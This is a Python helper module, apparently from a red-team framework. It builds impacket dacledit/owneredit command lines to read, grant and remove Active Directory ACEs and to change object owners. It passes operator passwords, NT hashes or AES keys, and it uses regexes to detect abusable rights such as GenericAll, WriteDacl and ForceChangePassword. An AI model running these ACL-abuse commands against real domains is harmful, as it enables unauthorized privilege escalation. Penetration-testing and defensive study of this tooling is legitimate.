"""Shared ACL/owner read-write infrastructure for the T3 executors.

Plain functions + regex constants only -- NO executor classes, precedented by
``process_manager.py`` being shared infra, and by ``certifried.py`` importing
plain helpers (``machine_account``/``_short_name``) from ``coercion.py``. Every
T3 executor's own "confirm precondition" step calls :func:`confirm_ace`, and
every ACE/owner read or write goes through one of the ``*_argv`` builders here,
so parsing rules can't drift across the 7 files that need them.

UNVERIFIED (pin in-lab): the exact human-readable rights wording impacket's
``dacledit.py``/``owneredit.py`` print. If the real wording differs, a T3
executor's ``confirm_ace`` call degrades to ``None`` (unknown -- attempt anyway
with an advisory), never a false ``viable=False``/abort -- the same fail-safe
contract every probe in this codebase already honours.
"""
from __future__ import annotations

import re
from typing import Optional

from .base import RunResult


def _tool_errored(res: RunResult) -> bool:
    """A hard runner failure (OSError / timeout / no return code) -> unreadable.

    Deliberately re-declared here rather than imported from ``probes.py``
    (the plan's stated preference): ``probes.py`` imports from
    ``executors.base``, so an import the OTHER way (``executors.acl_common``
    importing from ``..probes``) is import-order-fragile -- whichever of the
    two modules a test happens to import first can leave the other only
    partially initialized (``_tool_errored`` not yet defined) when this module
    is reached transitively through ``executors/__init__.py``. The check
    itself is a one-line, zero-logic duplicate of ``probes._tool_errored``,
    not a second implementation to keep in sync by hand.
    """
    return bool(res.error) or res.timed_out or res.returncode is None


# ---- ACE/owner read-success anchors ------------------------------------------
# A successful dacledit/owneredit read echoes one of these; its absence means
# the read did not actually RUN (transport/auth failure) -> unknown, never a
# false negative.
_RE_DACL_READ_OK = re.compile(r"(ACCESS[- ]ALLOWED|ace type|ObjectType|Rights\s*:)", re.I)
_RE_OWNER_READ_OK = re.compile(r"(current owner|owner\s*:|ownersid)", re.I)
_RE_OWNER_VALUE = re.compile(r"(?:current owner|owner)\s*[:=]\s*(\S.*)", re.I)

# ---- specific-right markers (matched against the TRUSTEE's own ACE line(s)) --
_RE_ACE_GENERIC_ALL = re.compile(r"(Generic[- ]?All|Full[- ]?Control)", re.I)
_RE_ACE_GENERIC_WRITE = re.compile(r"Generic[- ]?Write", re.I)
_RE_ACE_WRITE_DACL = re.compile(r"Write[- ]?Dacl", re.I)
_RE_ACE_WRITE_OWNER = re.compile(r"Write[- ]?Owner", re.I)
_RE_ACE_SELF_MEMBERSHIP = re.compile(r"Self[- ]?Membership", re.I)
_RE_FORCE_CHANGE_PW_RIGHT = re.compile(
    r"(User-?Force-?Change-?Password|00299570-246d-11d0-a768-00aa006e0529)", re.I)

# ---- write/remove success markers (UNVERIFIED -- pin in-lab) -----------------
_RE_DACL_WRITE_OK = re.compile(
    r"(DACL (modified|written) successfully|ace.*(added|written))", re.I)
_RE_DACL_REMOVE_OK = re.compile(
    r"(DACL (modified|written) successfully|ace.*(removed|deleted))", re.I)
_RE_OWNER_WRITE_OK = re.compile(r"(owner.*(modified|changed|set) successfully)", re.I)


def dacl_read_bind_ok(read_res: RunResult, read_text: str) -> bool:
    """Did a dacledit read POSITIVELY run (independent of what it shows)?

    Used by rollback-verification, which needs ``bind_ok`` as its own standalone
    boolean (per the plan's exact formula ``verified = bind_ok and
    (confirm_ace(...) is not True)``) -- NOT derived from ``confirm_ace``'s
    return value, because ``confirm_ace`` returns ``None`` both when the read
    failed to run AND when it ran fine but the trustee's ACE line is simply
    gone (the expected, successful-rollback case). Conflating those two would
    make a successful "ACE fully removed" rollback indistinguishable from an
    unreadable one.
    """
    return (not _tool_errored(read_res)) and bool(_RE_DACL_READ_OK.search(read_text or ""))


def owner_read_bind_ok(read_res: RunResult, read_text: str) -> bool:
    """The owneredit analogue of :func:`dacl_read_bind_ok`."""
    return (not _tool_errored(read_res)) and bool(_RE_OWNER_READ_OK.search(read_text or ""))


def _op_auth_argv(cfg) -> list[str]:
    """impacket-style operator-auth flags: ``-u op@dom`` plus the secret flag."""
    argv = ["-u", f"{cfg.username or ''}@{cfg.domain}"]
    if cfg.nt_hash:
        argv += ["-hashes", cfg.nt_hash]
    elif cfg.aes_key:
        argv += ["-aesKey", cfg.aes_key]
    elif cfg.password is not None:
        argv += ["-p", cfg.password]
    return argv


# ---------------------------------------------------------------- dacledit argv
def dacledit_read_argv(cfg, target: str, dc: str) -> list[str]:
    return ["dacledit.py", "-action", "read", "-target", target, "-dc-ip", dc,
            *_op_auth_argv(cfg)]


def dacledit_write_argv(cfg, target: str, dc: str, trustee: str,
                        rights: str = "FullControl") -> list[str]:
    return ["dacledit.py", "-action", "write", "-ace-type", "grant",
            "-rights", rights, "-principal", trustee, "-target", target,
            "-dc-ip", dc, *_op_auth_argv(cfg)]


def dacledit_remove_argv(cfg, target: str, dc: str, trustee: str,
                         rights: str = "FullControl") -> list[str]:
    return ["dacledit.py", "-action", "remove", "-ace-type", "grant",
            "-rights", rights, "-principal", trustee, "-target", target,
            "-dc-ip", dc, *_op_auth_argv(cfg)]


# ---------------------------------------------------------------- owneredit argv
def owneredit_read_argv(cfg, target: str, dc: str) -> list[str]:
    return ["owneredit.py", "-action", "read", "-target", target, "-dc-ip", dc,
            *_op_auth_argv(cfg)]


def owneredit_write_argv(cfg, target: str, dc: str, new_owner: str) -> list[str]:
    return ["owneredit.py", "-action", "write", "-new-owner", new_owner,
            "-target", target, "-dc-ip", dc, *_op_auth_argv(cfg)]


# ---------------------------------------------------------------- confirm_ace
def confirm_ace(read_res: RunResult, read_text: str, trustee: str,
               right_res: tuple[re.Pattern, ...]) -> Optional[bool]:
    """Tri-state, fail-safe like every probe in this codebase:

    ``True``  -- the read POSITIVELY shows ``trustee`` holding >=1 of
    ``right_res`` (sufficient).
    ``False`` -- the read POSITIVELY shows ``trustee``'s own ACE line, but none
    of ``right_res`` match it (positively INSUFFICIENT -- the only state that
    should abort a mutation before it fires).
    ``None``  -- unreadable / ``trustee``'s ACE line not located (unknown --
    NEVER a false negative; callers proceed anyway with an
    ``advisory:*_unconfirmed`` note, mirroring ``RbcdProbe``/``ShadowCredsProbe``'s
    existing fail-open philosophy).

    This 3-way branch (not a 2-way "block unless confirmed") is deliberate: it
    keeps T3 consistent with every existing probe's "unknown never skips, only a
    positive negative does" contract.
    """
    if _tool_errored(read_res) or not _RE_DACL_READ_OK.search(read_text or ""):
        return None
    trustee_lines = [ln for ln in (read_text or "").splitlines()
                     if trustee and trustee.lower() in ln.lower()]
    if not trustee_lines:
        return None
    joined = "\n".join(trustee_lines)
    return any(r.search(joined) for r in right_res)


__all__ = [
    "_RE_DACL_READ_OK", "_RE_OWNER_READ_OK", "_RE_OWNER_VALUE",
    "_RE_ACE_GENERIC_ALL", "_RE_ACE_GENERIC_WRITE", "_RE_ACE_WRITE_DACL",
    "_RE_ACE_WRITE_OWNER", "_RE_ACE_SELF_MEMBERSHIP", "_RE_FORCE_CHANGE_PW_RIGHT",
    "_RE_DACL_WRITE_OK", "_RE_DACL_REMOVE_OK", "_RE_OWNER_WRITE_OK",
    "dacledit_read_argv", "dacledit_write_argv", "dacledit_remove_argv",
    "owneredit_read_argv", "owneredit_write_argv", "confirm_ace",
    "dacl_read_bind_ok", "owner_read_bind_ok",
]
